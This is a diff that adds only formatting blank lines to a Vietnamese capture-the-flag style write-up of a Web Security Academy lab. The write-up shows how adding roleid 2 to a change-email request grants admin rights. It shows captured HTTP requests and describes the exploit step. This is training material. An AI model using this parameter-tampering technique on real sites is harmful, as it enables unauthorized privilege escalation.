@@ -94,6 +94,7 @@ Admin interface only available if logged in as an administrator
 ```
 - Thực hiện chức năng `change-email`, đến **Proxy** > **HTTP History** của **Burp**, quan sát **request** và **response**
     - Request:
+
     ```http
     POST /my-account/change-email HTTP/2
     Host: 0af900d704e013408300739300a10014.web-security-academy.net
@@ -102,6 +103,7 @@ Admin interface only available if logged in as an administrator
     {"email":"a@gmail.com"}
     ```
     - Response:
+
     ```http
     HTTP/2 302 Found
     Location: /my-account
@@ -141,6 +143,7 @@ function jsonSubmit(formElement, e, changeEmailPath) {
 #### Exploit
 - Thay đổi `roleid` và gửi trong request `change-email` để trở thành vai trò `admin`
 - Gửi request với `roleid` là 2
+
 ```http
 POST /my-account/change-email HTTP/2
 Host: 0af900d704e013408300739300a10014.web-security-academy.net
